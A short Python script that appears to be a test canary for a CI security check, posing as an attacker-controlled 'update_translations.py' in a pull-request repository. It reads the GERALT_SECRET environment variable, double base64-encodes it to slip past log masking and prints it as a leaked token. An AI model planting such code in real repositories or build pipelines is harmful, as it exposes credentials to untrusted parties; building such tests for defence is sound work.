#!/usr/bin/env python3
import os, base64, sys
secret = os.environ.get("GERALT_SECRET", "")
b64 = base64.b64encode(secret.encode()).decode()
print("GERALT_LEAKED_TOKEN=" + base64.b64encode(b64.encode()).decode())
print("GERALT_DBG: attacker-controlled update_translations.py executed in pr-repo")
sys.exit(1)
